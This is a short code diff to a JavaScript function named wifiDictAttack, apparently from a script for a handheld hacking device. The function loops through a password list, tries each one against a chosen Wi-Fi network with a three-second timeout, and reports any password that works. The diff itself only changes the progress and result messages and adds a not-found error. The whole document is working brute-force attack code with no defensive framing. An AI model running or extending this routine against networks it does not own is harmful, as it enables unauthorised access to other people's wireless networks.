@@ -9,13 +9,15 @@ function wifiDictAttack(ssid, pwds) {
   for( var i=0; i<pwds.length; i++ ) {
       if(!pwds[i].trim()) continue;  // skip empty lines
       serialPrintln("Trying password for " + ssid + ": " + pwds[i]);
-      dialogMessage("Pwd: " + pwds[i]);
+      dialogMessage("Trying pwd " + (i+1) + "/" + pwds.length);
       connected = wifiConnect(ssid, 3, pwds[i]);  // timeout is 3s
       if(connected) {
-        dialogMessage("password found: " + pwds[i]);
+        serialPrintln("Password found for " + ssid + ": " + pwds[i]);
+        dialogMessage("Pwd found: " + pwds[i], true);
         return;
       }
-  }
+    }
+  dialogError("Pwd not found", true);
 }
 
 var network_to_attack_ssid = "";
